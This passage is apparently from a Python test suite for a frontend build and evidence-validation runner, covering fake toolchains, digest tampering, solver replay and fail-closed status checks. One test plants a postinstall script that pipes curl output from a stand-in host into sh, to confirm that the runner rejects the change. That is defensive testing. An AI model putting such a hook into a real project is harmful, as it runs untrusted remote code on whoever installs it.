    ThreadingHTTPServer(('127.0.0.1', port), Handler).serve_forever()
raise SystemExit(3)
""",
    )
    chrome_path = binary / "chrome"
    if chrome:
        write_executable(
            chrome_path,
            """#!/usr/bin/env python3
import os, sys
from urllib.request import urlopen
if 'ELMOS_TEST_SECRET' in os.environ: raise SystemExit(91)
if sys.argv[1:] == ['--version']:
    print('Google Chrome 151.0.0.0'); raise SystemExit(0)
with urlopen(sys.argv[-1], timeout=5) as response: sys.stdout.buffer.write(response.read())
""",
        )
    return binary, chrome_path


def build_block_specific_partial_record(
    root: Path,
) -> tuple[dict[str, object], dict[str, object], Path, list[dict[str, object]]]:
    evidence_root = root / "runtime-evidence"
    evidence_root.mkdir()
    scenario_ids = ["SCENARIO_ACTUAL_A", "SCENARIO_ACTUAL_B"]
    scenario_manifest = [
        {"scenario_id": scenario_id, "input": runtime_scenario_input()}
        for scenario_id in scenario_ids
    ]
    passed_block_ids = tuple(
        block_id
        for block_id in runner.INTERACTION_BLOCK_IDS
        if block_id not in runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS
    )
    not_run_block_ids = tuple(
        block_id
        for block_id in runner.INTERACTION_BLOCK_IDS
        if block_id in runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS
    )
    raw_artifacts: list[dict[str, object]] = []
    source_artifacts: list[dict[str, object]] = []
    scenarios: list[dict[str, object]] = []
    per_block_ids = {block_id: [] for block_id in runner.INTERACTION_BLOCK_IDS}
    not_run_reasons = {
        block_id: f"{block_id} lacks its exact Web observer surface"
        for block_id in not_run_block_ids
    }
    browser_ids = ("google-chrome", "mozilla-firefox")
    for scenario in scenario_manifest:
        scenario_id = scenario["scenario_id"]
        generic_captures = {
            "browser-dom-snapshot": {
                "root_selector": "#elmos-interaction",
                "outer_html": (
                    f'<section data-scenario-id="{scenario_id}">actual DOM</section>'
                ),
            },
            "browser-framework-event-trace": {
                "events": [
                    {
                        "type": "click",
                        "target": {"data-run-scenario": scenario_id},
                    }
                ]
            },
            "browser-accessibility-axe-trace": {
                "aria_snapshot": '- main:\n  - heading "Home" [level=1]',
                "active_element": {
                    "browser_matrix": [
                        {"browser_id": browser_id, "value": {"tag": "button"}}
                        for browser_id in browser_ids
                    ]
                },
                "axe_results": {"violations": [], "browser_matrix": []},
                "keyboard_events": [{"type": "keydown", "key": "Enter"}],
                "focus_events": [{"type": "focusin", "tag": "button"}],
            },
            "browser-network-trace": {
                "events": [
                    {
                        "kind": "request",
                        "method": "POST",
                        "url": "http://127.0.0.1:4173/api/search",
                    }
                ]
            },
        }
        trace_refs = {
            role: runner.browser_trace_ref(
                evidence_root,
                profile_id="react",
                scenario_id=scenario_id,
                role=role,
                capture=capture,
            )
            for role, capture in generic_captures.items()
        }
        source_artifacts.extend(trace_refs.values())
        observations: dict[str, dict[str, object]] = {}
        block_statuses: dict[str, dict[str, object]] = {}
        for block_id in runner.INTERACTION_BLOCK_IDS:
            if block_id in not_run_block_ids:
                block_statuses[block_id] = {
                    "status": "NOT_RUN",
                    "reason": not_run_reasons[block_id],
                }
                continue
            measurement = runtime_block_measurement(block_id, scenario_id)
            observation_ref, block_trace_ref = runner.browser_observation_ref(
                evidence_root,
                profile_id="react",
                scenario_id=scenario_id,
                block_id=block_id,
                scenario_input=scenario["input"],
                browser_measurements=[
                    {
                        "browser_id": browser_id,
                        "measurement": copy.deepcopy(measurement),
                    }
                    for browser_id in browser_ids
                ],
                trace_refs=trace_refs,
            )
            observations[block_id] = observation_ref
            raw_artifacts.append(observation_ref)
            source_artifacts.append(block_trace_ref)
            per_block_ids[block_id].append(observation_ref["artifact_id"])
            block_statuses[block_id] = {"status": "PASSED", "reason": None}
        scenarios.append(
            {
                "scenario_id": scenario_id,
                "status": "NOT_RUN",
                "reason": runner.BLOCK_SPECIFIC_RUNTIME_PARTIAL_REASON,
                "block_statuses": block_statuses,
                "block_observation_refs": observations,
            }
        )

    semantic_blocks = {
        block_id: {
            "status": "PASSED" if block_id in passed_block_ids else "NOT_RUN",
            "reason": None if block_id in passed_block_ids else not_run_reasons[block_id],
            "observation_refs": per_block_ids[block_id],
            "observation_digest": runner.digest_json(per_block_ids[block_id]),
        }
        for block_id in runner.INTERACTION_BLOCK_IDS
    }
    tool_path = Path(sys.executable).resolve()
    tool_identity = runner.runtime_tool_identity(tool_path, sys.version.split()[0])
    runtime_tools = [
        {
            "role": role,
            **tool_identity,
            "package_closure_digest": "sha256:" + "5" * 64,
        }
        for role in (
            "playwright-driver-node",
            "browser-chromium",
            "browser-firefox",
        )
    ]
    environment = {
        "allowlisted_inherited_keys": [],
        "explicit": {},
        "network_allowed": False,
        "unlisted_environment_inherited": False,
    }

    def execution(
        phase: str, artifact_refs: list[str], *, stdout: bytes = b""
    ) -> dict[str, object]:
        value = {
            "schema_version": "1.0",
            "kind": "frontend-interaction-runtime-execution",
            "phase": phase,
            "tool": tool_identity,
            "argv": [str(tool_path), "--version"],
            "cwd": str(evidence_root),
            "started_at": "2026-08-09T00:00:00Z",
            "duration_ms": 1,
            "timeout_seconds": 10,
            "exit_code": 0,
            "signal": None,
            "status": "PASSED",
            "reason": None,
            "environment": environment,
            "stdout": runner.bounded_stream(stdout),
            "stderr": runner.bounded_stream(b""),
            "artifact_refs": artifact_refs,
        }
        value["execution_id"] = runner.digest_json(value)
        return value

    build_execution = execution("BUILD", [])
    startup_execution = execution("STARTUP", [])
    result_manifest_value = {
        "schema_version": "1.0",
        "kind": "frontend-interaction-runtime-result-manifest",
        "profile_id": "react",
        "channel": "browser",
        "scenario_ids": scenario_ids,
        "semantic_block_ids": list(runner.INTERACTION_BLOCK_IDS),
        "runtime_source_artifact_ids": [
            item["artifact_id"] for item in source_artifacts
        ],
        "runtime_source_artifact_count": len(source_artifacts),
        "observation_artifact_ids": [item["artifact_id"] for item in raw_artifacts],
        "observation_artifact_count": len(raw_artifacts),
        "passed_block_ids": list(passed_block_ids),
        "not_run_block_ids": list(not_run_block_ids),
        "runtime_tool_digests": [item["sha256"] for item in runtime_tools],
        "prerequisite_execution_ids": [
            build_execution["execution_id"],
            startup_execution["execution_id"],
        ],
    }
    manifest_relative, manifest_sha, manifest_bytes = (
        runner.write_content_addressed_runtime_json(
            evidence_root, "manifests/react/browser", result_manifest_value
        )
    )
    result_manifest_ref = {
        "role": "runtime-result-manifest",
        "profile_id": "react",
        "channel": "browser",
        "path": manifest_relative,
        "sha256": manifest_sha,
        "byte_count": manifest_bytes,
        "manifest_digest": runner.digest_json(result_manifest_value),
    }
    result_manifest_ref["artifact_id"] = runner.digest_json(result_manifest_ref)
    journey_refs = [
        *[item["artifact_id"] for item in source_artifacts],
        *[item["artifact_id"] for item in raw_artifacts],
        result_manifest_ref["artifact_id"],
    ]
    journey_stdout = (
        runner.canonical_json(
            {
                "result_manifest_artifact_id": result_manifest_ref["artifact_id"],
                "result_manifest_sha256": result_manifest_ref["sha256"],
            }
        )
        + "\n"
    ).encode("utf-8")
    journey_execution = execution("JOURNEY", journey_refs, stdout=journey_stdout)
    phase_policy = {
        phase: {
            "phase": phase,
            "tool": tool_identity,
            "argv": [str(tool_path), "--version"],
            "cwd": str(evidence_root),
            "environment": environment,
        }
        for phase in ("BUILD", "STARTUP", "JOURNEY")
    }
    execution_policy = {
        "schema_version": "1.0",
        "kind": "frontend-interaction-runtime-execution-policy",
        "profile_id": "react",
        "channel": "browser",
        "runner_kind": "PLAYWRIGHT_BROWSER_INTERACTION",
        "phases": phase_policy,
        "runtime_tools": runtime_tools,
    }
    record = {
        "channel": "browser",
        "required": True,
        "status": "NOT_RUN",
        "reason": runner.BLOCK_SPECIFIC_RUNTIME_PARTIAL_REASON,
        "runner_kind": "PLAYWRIGHT_BROWSER_INTERACTION",
        "tool_discovery": [
            {
                "kind": "EXACT_BROWSER_MATRIX",
                "policy_id": "node-web-chromium-firefox-v1",
                "browser_matrix": [
                    {
                        "browser_id": "google-chrome",
                        "engine": "chromium",
                        "version": "test-chromium",
                        "executable_sha256": tool_identity["sha256"],
                    },
                    {
                        "browser_id": "mozilla-firefox",
                        "engine": "firefox",
                        "version": "test-firefox",
                        "executable_sha256": tool_identity["sha256"],
                    },
                ],
                "cross_browser": True,
            }
        ],
        "execution_policy_digest": runner.digest_json(execution_policy),
        "runtime_tools": runtime_tools,
        "build_execution": build_execution,
        "startup_execution": startup_execution,
        "journey_execution": journey_execution,
        "scenario_manifest_digest": runner.digest_json(scenario_ids),
        "scenario_count": len(scenario_ids),
        "scenarios": scenarios,
        "semantic_blocks": semantic_blocks,
        "raw_artifacts": raw_artifacts,
        "runtime_source_artifacts": source_artifacts,
        "result_manifest": result_manifest_ref,
        "model_values_used_as_actual": False,
    }
    return record, execution_policy, evidence_root, scenario_manifest


class FrontendFormalToolchainTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.fixture = CampaignFixture(self.root / "campaign")

    def test_accepts_exact_nine_profile_seventy_two_route_protocol(self) -> None:
        campaign = runner.load_campaign(self.fixture.path)
        self.assertEqual(set(campaign.profiles), set(runner.EXPECTED_PROFILES))
        self.assertEqual(len(campaign.routes), 72)
        self.assertEqual(campaign.profiles["react"].relift_model, self.fixture.model)

    def test_node_build_and_full_declared_route_subprocess_browser_probes(self) -> None:
        binary, chrome_path = fake_toolchain(self.root / "tools")
        environment = {
            "PATH": f"{binary}{os.pathsep}{os.environ['PATH']}",
            "ELMOS_TEST_SECRET": "must-not-leak",
        }
        with patch.dict(os.environ, environment, clear=False):
            campaign = runner.load_campaign(self.fixture.path)
            evidence = runner.execute_campaign(
                campaign,
                runner.RunnerPolicy(
                    no_network=True,
                    timeout_seconds=10,
                    selected_profiles=frozenset({"react"}),
                    fail_on_unavailable=True,
                    chrome_path=str(chrome_path),
                ),
            )
        react = next(
            item
            for item in evidence["profile_executions"]
            if item["profile_id"] == "react"
        )
        self.assertEqual(react["status"], "PASSED")
        self.assertEqual(react["target_build"], "PASSED")
        self.assertEqual(react["browser_journey"]["status"], "PASSED")
        self.assertEqual(
            [probe["name"] for probe in react["browser_journey"]["probes"]],
            ["initial", "declared-0", "declared-1", "declared-2", "unknown"],
        )
        self.assertTrue(
            all(
                probe["observation"]["matches_model"]
                for probe in react["browser_journey"]["probes"]
            )
        )
        self.assertEqual(
            react["browser_journey"]["probes"][0]["normalized_observation"]["route"],
            self.fixture.model["routes"][0],
        )
        self.assertEqual(
            react["browser_journey"]["probes"][0]["normalized_observation"]["render"],
            {"navigationLabel": "主要导航", "mainRole": "main", "headingLevel": 1},
        )
        self.assertIsNotNone(react["artifacts"]["dependency_lock"])
        self.assertIsNotNone(react["artifacts"]["build_output"])
        argv_rows = [record["argv"] for record in react["commands"]]
        self.assertTrue(any("--package-lock-only" in row for row in argv_rows))
        self.assertTrue(any("--ignore-scripts" in row for row in argv_rows))
        self.assertTrue(
            all(
                not record["environment"]["unlisted_environment_inherited"]
                for record in react["tool_versions"] + react["commands"]
            )
        )
        self.assertTrue(
            all(
                not Path(record["cwd"]).exists()
                for record in react["tool_versions"] + react["commands"]
            ),
            "the exact per-profile dependency workspace must be reclaimed",
        )
        self.assertEqual(
            evidence["policy"]["workspace_retention"],
            "PER_PROFILE_TEMPORARY_RECLAIMED_AFTER_EVIDENCE_CAPTURE",
        )
        self.assertEqual(evidence["summary"]["browser_journeys_passed"], 1)
        self.assertEqual(
            evidence["producer"]["sha256"],
            runner.sha256_bytes(RUNNER_PATH.read_bytes()),
        )
        self.assertEqual(evidence["producer"]["byte_count"], RUNNER_PATH.stat().st_size)
        self.assertRegex(
            evidence["evidence_identity"]["sha256"], r"^sha256:[0-9a-f]{64}$"
        )
        self.assertEqual(len(evidence["route_records"]), 72)
        self.assertTrue(
            all(
                row["device_or_simulator_evidence"] == "NOT_RUN"
                for row in evidence["route_records"]
            )
        )

    def test_harmony_missing_tool_is_honest_not_run_and_policy_can_fail(self) -> None:
        output = self.root / "result.json"
        result = runner.main(
            [
                str(self.fixture.path),
                "--profile",
                "harmony-arkui",
                "--no-network",
                "--timeout-seconds",
                "2",
                "--fail-on-unavailable",
                "--harmony-tool",
                str(self.root / "missing-hvigor"),
                "--output",
                str(output),
            ]
        )
        self.assertEqual(result, 1)
        value = json.loads(output.read_text())
        harmony = next(
            item
            for item in value["profile_executions"]
            if item["profile_id"] == "harmony-arkui"
        )
        self.assertEqual(harmony["status"], "NOT_RUN")
        self.assertEqual(harmony["reason"], "DEVECO_HVIGOR_TOOLCHAIN_UNAVAILABLE")
        self.assertEqual(
            value["replay"]["campaign_sha256"],
            runner.sha256_bytes(self.fixture.path.read_bytes()),
        )
        self.assertIn("--fail-on-unavailable", value["replay"]["argv"])
        self.assertEqual(value["replay"]["replay_execution"], "NOT_RUN")
        self.assertEqual(value["replay"]["portable_pack_replay"], "NOT_RUN")

    def test_node_version_drift_fails_closed_before_install(self) -> None:
        binary, chrome_path = fake_toolchain(
            self.root / "tools", node_version="v25.0.0"
        )
        with patch.dict(
            os.environ,
            {"PATH": f"{binary}{os.pathsep}{os.environ['PATH']}"},
            clear=False,
        ):
            evidence = runner.execute_campaign(
                runner.load_campaign(self.fixture.path),
                runner.RunnerPolicy(
                    no_network=True,
                    timeout_seconds=5,
                    selected_profiles=frozenset({"react"}),
                    fail_on_unavailable=False,
                    chrome_path=str(chrome_path),
                ),
            )
        react = next(
            item
            for item in evidence["profile_executions"]
            if item["profile_id"] == "react"
        )
        self.assertEqual(react["status"], "FAILED")
        self.assertEqual(react["reason"], "NODE_OR_NPM_VERSION_DRIFT")
        self.assertEqual(react["commands"], [])
        self.assertEqual(react["browser_journey"]["status"], "NOT_RUN")

    def test_offline_npm_undefined_metadata_is_unavailable_not_build_failure(
        self,
    ) -> None:
        unavailable = {
            "stdout": {"text": ""},
            "stderr": {"text": "ERESOLVE Found: rxjs@undefined while npm --offline"},
        }
        real_conflict = {
            "stdout": {"text": ""},
            "stderr": {"text": "ERESOLVE peer dependency conflict"},
        }
        self.assertTrue(runner.npm_offline_cache_miss(unavailable))
        self.assertFalse(runner.npm_offline_cache_miss(real_conflict))

    def test_react_native_build_does_not_masquerade_as_dom_or_device(self) -> None:
        binary, chrome_path = fake_toolchain(self.root / "tools")
        with patch.dict(
            os.environ,
            {"PATH": f"{binary}{os.pathsep}{os.environ['PATH']}"},
            clear=False,
        ):
            evidence = runner.execute_campaign(
                runner.load_campaign(self.fixture.path),
                runner.RunnerPolicy(
                    no_network=True,
                    timeout_seconds=5,
                    selected_profiles=frozenset({"react-native"}),
                    fail_on_unavailable=False,
                    chrome_path=str(chrome_path),
                ),
            )
        react_native = next(
            item
            for item in evidence["profile_executions"]
            if item["profile_id"] == "react-native"
        )
        self.assertEqual(react_native["target_build"], "PASSED")
        self.assertEqual(react_native["status"], "NOT_RUN")
        self.assertEqual(
            react_native["browser_journey"]["reason"],
            "REACT_NATIVE_WEB_OBSERVER_UNSUPPORTED",
        )
        self.assertEqual(
            react_native["boundaries"]["device_or_simulator_journey"], "NOT_RUN"
        )

    def test_flutter_test_disables_dds_without_weakening_test_execution(self) -> None:
        workspace = self.root / "flutter-runner-project"
        shutil.copytree(self.fixture.root / "profiles/flutter/project", workspace)
        profile = runner.ProfileArtifact(
            profile_id="flutter",
            framework_version="3.44.1",
            platforms=("ANDROID", "IOS", "WEB"),
            project_path=workspace,
            project_digest="sha256:" + "1" * 64,
            navigation_source_path="lib/elmos_bounded_navigation.dart",
            manifest_path=self.fixture.root / "profiles/flutter/manifest.json",
            relift_model_digest=self.fixture.model_digest,
            relift_model=self.fixture.model,
        )
        observed_argv: list[list[str]] = []

        def fake_run_command(argv, *, cwd, **_kwargs):
            observed_argv.append(list(argv))
            if list(argv[1:]) == ["pub", "get"]:
                (cwd / "pubspec.lock").write_text("locked\n", encoding="utf-8")
            if list(argv[1:]) == ["build", "web", "--no-pub"]:
                build = cwd / "build/web"
                build.mkdir(parents=True)
                (build / "index.html").write_text("built\n", encoding="utf-8")
            stdout = b""
            if list(argv[1:]) == ["--version", "--machine"]:
                stdout = json.dumps(
                    {"frameworkVersion": "3.44.1", "dartSdkVersion": "3.12.1"}
                ).encode()
            return {
                **runner.skipped_command(argv, cwd, "fixture"),
                "argv": [str(Path(argv[0]).resolve()), *argv[1:]],
                "status": "PASSED",
                "reason": None,
                "exit_code": 0,
                "stdout": runner.bounded_stream(stdout),
            }

        with patch.object(runner, "run_command", side_effect=fake_run_command):
            result = runner.execute_flutter_profile(
                profile,
                workspace,
                runner.RunnerPolicy(
                    no_network=False,
                    timeout_seconds=30,
                    selected_profiles=frozenset({"flutter"}),
                    fail_on_unavailable=False,
                ),
            )
        self.assertIn(
            [
                "/opt/homebrew/bin/flutter",
                "test",
                "--no-pub",
                "--no-dds",
                "--concurrency=1",
            ],
            observed_argv,
        )
        self.assertEqual(result["target_build"], "PASSED")
        self.assertEqual(result["browser_journey"]["status"], "NOT_RUN")

    def test_missing_pair_rejected(self) -> None:
        self.fixture.data["routes"].pop()
        self.fixture.write_campaign()
        with self.assertRaisesRegex(runner.ValidationError, "incomplete"):
            runner.load_campaign(self.fixture.path)

    def test_missing_chunk_artifact_rejected(self) -> None:
        first = self.fixture.routes[0]
        route_root = self.fixture.root / "routes" / first["route_id"]
        (route_root / "chunks.json").unlink()
        with self.assertRaisesRegex(runner.ValidationError, "does not resolve"):
            runner.load_campaign(self.fixture.path)

    def test_missing_behavior_artifact_rejected(self) -> None:
        first = self.fixture.routes[0]
        route_root = self.fixture.root / "routes" / first["route_id"]
        (route_root / "behavior.json").unlink()
        with self.assertRaisesRegex(runner.ValidationError, "does not resolve"):
            runner.load_campaign(self.fixture.path)

    def test_missing_formal_input_rejected(self) -> None:
        formal = self.fixture.root / self.fixture.routes[0]["formal_input_path"]
        formal.unlink()
        with self.assertRaisesRegex(runner.ValidationError, "does not resolve"):
            runner.load_campaign(self.fixture.path)

    def test_formal_input_byte_tamper_rejected(self) -> None:
        formal = self.fixture.root / self.fixture.routes[0]["formal_input_path"]
        formal.write_bytes(formal.read_bytes() + b" \n")
        with self.assertRaisesRegex(
            runner.ValidationError, "formal input digest mismatch"
        ):
            runner.load_campaign(self.fixture.path)

    def test_unknown_solver_cannot_masquerade_as_proof(self) -> None:
        solver = self.fixture.root / self.fixture.routes[0]["solver_result_path"]
        value = json.loads(solver.read_text())
        value["outcome"] = "UNKNOWN"
        value["exit_code"] = 1
        write_json(solver, value)
        with self.assertRaisesRegex(
            runner.ValidationError, "solver result binding mismatch"
        ):
            runner.load_campaign(self.fixture.path)

    def test_solver_identity_and_raw_contract_tamper_rejected(self) -> None:
        solver_path = self.fixture.root / self.fixture.routes[0]["solver_result_path"]
        original = json.loads(solver_path.read_text())
        fake_binary = self.root / "fake-solver" / "z3"
        fake_binary.parent.mkdir()
        write_executable(fake_binary, "#!/bin/sh\nprintf 'unsat\\n'\n")
        fake_digest = runner.sha256_bytes(fake_binary.read_bytes())
        cases = {
            "unverified proof": {
                "identity_status": "REJECTED",
                "stderr": "identity rejected",
            },
            "fake binary": {
                "solver": str(fake_binary),
                "solver_binary_realpath": str(fake_binary),
                "solver_binary_sha256": fake_digest,
                "invocation": [str(fake_binary), "-in"],
            },
            "version drift": {"solver_version": "Z3 version 4.15.0 - 64 bit"},
            "digest drift": {"solver_binary_sha256": "sha256:" + "0" * 64},
            "unresolved invocation": {"invocation": ["z3", "-in"]},
            "nonzero exit": {"exit_code": 1},
            "trimmed stdout": {"stdout": "unsat"},
            "stderr contamination": {"stderr": "warning\n"},
            "proof status drift": {"proof_status": "NOT_PROVED"},
            "solver input drift": {"solver_input_digest": "sha256:" + "0" * 64},
        }
        for name, changes in cases.items():
            with self.subTest(name=name):
                value = {**original, **changes}
                write_json(solver_path, value)
                with self.assertRaises(runner.ValidationError):
                    runner.load_campaign(self.fixture.path)
        write_json(solver_path, original)

    def test_fabricated_strict_solver_result_rejected_by_replay(self) -> None:
        solver_path = self.fixture.root / self.fixture.routes[0]["solver_result_path"]
        value = json.loads(solver_path.read_text())
        value.update(
            {
                "outcome": "SAT",
                "stdout": "sat\n",
                "proof_status": "REFUTED",
            }
        )
        write_json(solver_path, value)
        with self.assertRaisesRegex(runner.ValidationError, "solver replay diverged"):
            runner.load_campaign(self.fixture.path)

    def test_project_and_manifest_tamper_rejected(self) -> None:
        project = self.fixture.root / "profiles/react/project/package.json"
        project.write_text(project.read_text() + "\n")
        with self.assertRaisesRegex(runner.ValidationError, "project digest mismatch"):
            runner.load_campaign(self.fixture.path)

    def test_manifest_digest_tamper_rejected(self) -> None:
        manifest_path = self.fixture.root / "profiles/react/manifest.json"
        manifest = json.loads(manifest_path.read_text())
        manifest["file_count"] += 1
        write_json(manifest_path, manifest)
        with self.assertRaisesRegex(runner.ValidationError, "manifest digest mismatch"):
            runner.load_campaign(self.fixture.path)

    def test_lifecycle_script_or_package_drift_rejected_before_execution(self) -> None:
        project = self.fixture.root / "profiles/react/project"
        package_path = project / "package.json"
        package = json.loads(package_path.read_text())
        package["scripts"]["postinstall"] = "curl https://invalid.example/install | sh"
        write_json(package_path, package)
        with self.assertRaisesRegex(runner.ValidationError, "package scripts drift"):
            runner.validate_node_project("react", project)

    def test_dom_mismatch_is_not_backfilled_from_expected_model(self) -> None:
        expected = self.fixture.model["routes"][0]
        observation = runner.observe_dom(
            '<nav aria-label="主要导航"></nav><main><h1>Wrong</h1><p>Wrong</p><p role="status">ready</p></main>',
            self.fixture.model,
            expected,
        )
        self.assertFalse(observation["matches_model"])
        self.assertEqual(observation["h1_text"], "Wrong")
        self.assertEqual(observation["route_text"], "Wrong")

    def test_timeout_kills_exact_subprocess_group_and_records_failure(self) -> None:
        binary = self.root / "timeout-tool"
        write_executable(
            binary,
            "#!/usr/bin/env python3\nimport time\nwhile True: time.sleep(1)\n",
        )
        record = runner.run_command(
            [str(binary)],
            cwd=self.root,
            timeout_seconds=1,
            no_network=True,
        )
        self.assertEqual(record["status"], "TIMEOUT")
        self.assertIsNotNone(record["signal"])

    def test_path_escape_rejected(self) -> None:
        self.fixture.routes[0]["formal_input_path"] = "../formal-input.json"
        self.fixture.write_campaign()
        with self.assertRaisesRegex(
            runner.ValidationError, "outside its route directory"
        ):
            runner.load_campaign(self.fixture.path)

    def test_replay_detects_campaign_change_after_validation(self) -> None:
        loaded = runner.load_campaign(self.fixture.path)
        self.fixture.data["certification"] = "CERTIFIED"
        self.fixture.write_campaign()
        with self.assertRaises(runner.ValidationError):
            runner.execute_campaign(
                loaded,
                runner.RunnerPolicy(
                    no_network=True,
                    timeout_seconds=2,
                    selected_profiles=frozenset(),
                    fail_on_unavailable=False,
                ),
            )

    def test_stale_runner_producer_identity_rejected(self) -> None:
        loaded = runner.load_campaign(self.fixture.path)
        with self.assertRaisesRegex(runner.ValidationError, "producer identity"):
            runner.execute_campaign(
                loaded,
                runner.RunnerPolicy(
                    no_network=True,
                    timeout_seconds=2,
                    selected_profiles=frozenset(),
                    fail_on_unavailable=False,
                    producer_digest="sha256:" + "0" * 64,
                ),
            )

    def test_emitted_summary_is_recomputed_from_final_records(self) -> None:
        evidence = runner.execute_campaign(
            runner.load_campaign(self.fixture.path),
            runner.RunnerPolicy(
                no_network=True,
                timeout_seconds=2,
                selected_profiles=frozenset(),
                fail_on_unavailable=False,
            ),
        )
        evidence["summary"]["profile_status_counts"] = {
            "PASSED": 0,
            "FAILED": 1,
            "NOT_RUN": 8,
        }
        evidence["summary"]["route_status_counts"] = {
            "PASSED": 0,
            "FAILED": 16,
            "NOT_RUN": 56,
        }
        with self.assertRaisesRegex(
            runner.ValidationError, "summary does not match final"
        ):
            runner.validate_emitted_evidence(evidence, require_replay=False)

    def test_unknown_status_masquerade_rejected(self) -> None:
        self.fixture.routes[0]["status"] = "UNKNOWN"
        self.fixture.routes[0]["layered_result"] = "UNKNOWN"
        self.fixture.write_campaign()
        with self.assertRaisesRegex(runner.ValidationError, "proof status"):
            runner.load_campaign(self.fixture.path)

    def test_runtime_channel_applicability_is_exact_and_fail_closed(self) -> None:
        self.assertEqual(runner.required_runtime_channels("react"), ("browser",))
        self.assertEqual(
            runner.required_runtime_channels("react-native"),
            ("browser", "android", "ios"),
        )
        self.assertEqual(
            runner.required_runtime_channels("flutter"),
            ("browser", "android", "ios"),
        )
        self.assertEqual(
            runner.required_runtime_channels("harmony-arkui"), ("harmonyos",)
        )
        web_native = runner.unavailable_runtime_channel(
            "react", "ios", "MUST_NOT_OVERRIDE_DERIVED_APPLICABILITY"
        )
        self.assertEqual(web_native["status"], "NOT_APPLICABLE")
        self.assertEqual(web_native["reason"], "PROFILE_CHANNEL_NOT_APPLICABLE")
        mobile_browser = runner.unavailable_runtime_channel(
            "react-native", "browser", "PLAYWRIGHT_NOT_EXECUTED"
        )
        self.assertEqual(mobile_browser["status"], "NOT_RUN")
        self.assertTrue(mobile_browser["required"])

    def test_runtime_json_is_persistent_and_content_addressed(self) -> None:
        evidence_root = self.root / "runtime-content-addressed"
        value = {"schema_version": "1.0", "kind": "actual-runtime-fixture"}
        first = runner.write_content_addressed_runtime_json(
            evidence_root, "traces/react/browser/SCENARIO", value
        )
        second = runner.write_content_addressed_runtime_json(
            evidence_root, "traces/react/browser/SCENARIO", value
        )
        self.assertEqual(first, second)
        relative, digest, byte_count = first
        path = evidence_root / relative
        self.assertEqual(path.stat().st_size, byte_count)
        self.assertEqual(runner.sha256_bytes(path.read_bytes()), digest)
        self.assertEqual(path.stem, digest.removeprefix("sha256:"))

    def test_runtime_execution_accepts_only_a_symlink_to_bound_tool(self) -> None:
        true_path = Path(shutil.which("true") or "/usr/bin/true").resolve()
        link = self.root / "runtime-true"
        link.symlink_to(true_path)
        command = runner.run_command(
            [str(link), "--version"],
            cwd=self.root,
            timeout_seconds=10,
            no_network=True,
            explicit_env={},
        )
        tool = runner.runtime_tool_identity(link, "true-test")
        execution = runner.runtime_execution_from_command(
            command, phase="BUILD", tool=tool
        )
        policy = runner.runtime_phase_policy(execution)
        self.assertEqual(
            runner.validate_runtime_execution(
                execution, "symlink-runtime", "BUILD", set(), policy
            )["status"],
            "PASSED",
        )

    def test_block_measurement_contract_roundtrip_and_key_drift_fail_closed(
        self,
    ) -> None:
        scenario_input = runtime_scenario_input()
        for block_id in runner.INTERACTION_BLOCK_IDS:
            with self.subTest(block_id=block_id, case="roundtrip"):
                measurement = runtime_block_measurement(block_id)
                self.assertEqual(
                    runner.derive_actual_from_block_measurement(
                        block_id,
                        measurement,
                        scenario_input=scenario_input,
                        name=block_id,
                    ),
                    runtime_block_actual(block_id),
                )
            with self.subTest(block_id=block_id, case="missing-key"):
                missing = runtime_block_measurement(block_id)
                missing.pop(next(iter(missing)))
                with self.assertRaisesRegex(
                    runner.ValidationError, "fields are not exact"
                ):
                    runner.derive_actual_from_block_measurement(
                        block_id,
                        missing,
                        scenario_input=scenario_input,
                        name=block_id,
                    )
            with self.subTest(block_id=block_id, case="extra-key"):
                extra = runtime_block_measurement(block_id)
                extra["consumer_model_actual"] = "forbidden"
                with self.assertRaisesRegex(
                    runner.ValidationError, "fields are not exact"
                ):
                    runner.derive_actual_from_block_measurement(
                        block_id,
                        extra,
                        scenario_input=scenario_input,
                        name=block_id,
                    )

    def test_runtime_driver_contract_exact_block_and_native_ceilings(self) -> None:
        contract = runtime_driver_contract("react")
        model_digest = contract["channel_projection_contract"]["model_digest"]
        validated = runner.validate_runtime_driver_contract(
            contract,
            "react",
            "react.runtime_driver_contract",
            model_digest=model_digest,
        )
        self.assertEqual(set(validated), runner.RUNTIME_DRIVER_CONTRACT_KEYS)
        self.assertEqual(
            validated["browser_required_not_run_blocks"],
            list(runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS),
        )
        self.assertEqual(
            validated["native_required_not_run_blocks"], ["api-network"]
        )

        extra = copy.deepcopy(contract)
        extra["consumer_actual_allowed"] = True
        with self.assertRaisesRegex(runner.ValidationError, "fields are not exact"):
            runner.validate_runtime_driver_contract(
                extra,
                "react",
                "react.runtime_driver_contract",
                model_digest=model_digest,
            )

        browser_promotion = copy.deepcopy(contract)
        browser_promotion["block_observer_contracts"]["api-network"][
            "browser_status"
        ] = "PASSED"
        browser_promotion["browser_required_not_run_blocks"].remove("api-network")
        with self.assertRaisesRegex(
            runner.ValidationError, "browser/native observer ceiling drift"
        ):
            runner.validate_runtime_driver_contract(
                browser_promotion,
                "react",
                "react.runtime_driver_contract",
                model_digest=model_digest,
            )

        native_promotion = copy.deepcopy(contract)
        native_promotion["block_observer_contracts"]["api-network"][
            "native_status"
        ] = "PASSED"
        native_promotion["native_required_not_run_blocks"] = []
        with self.assertRaisesRegex(
            runner.ValidationError, "browser/native observer ceiling drift"
        ):
            runner.validate_runtime_driver_contract(
                native_promotion,
                "react",
                "react.runtime_driver_contract",
                model_digest=model_digest,
            )

        wrong_projection = copy.deepcopy(contract)
        wrong_projection["channel_projection_contract"]["channels"]["browser"][
            "scenarios"
        ][0]["blocks"]["state-management"]["after"] += 1
        wrong_projection["channel_projection_contract"]["channels"]["browser"][
            "scenarios"
        ][0]["block_digests"]["state-management"] = runner.digest_json(
            wrong_projection["channel_projection_contract"]["channels"][
                "browser"
            ]["scenarios"][0]["blocks"]["state-management"]
        )
        with self.assertRaisesRegex(
            runner.ValidationError, "channel projection digest drift"
        ):
            runner.validate_runtime_driver_contract(
                wrong_projection,
                "react",
                "react.runtime_driver_contract",
                model_digest=model_digest,
            )

    def test_a11y_and_i18n_actuals_reject_stale_marker_equivalents(self) -> None:
        accessibility = runtime_block_measurement("accessibility-focus")
        accessibility["accessibility_state"]["main_role"] = "main"
        accessibility["aria_snapshot"] = '- button "stale marker still says main"'
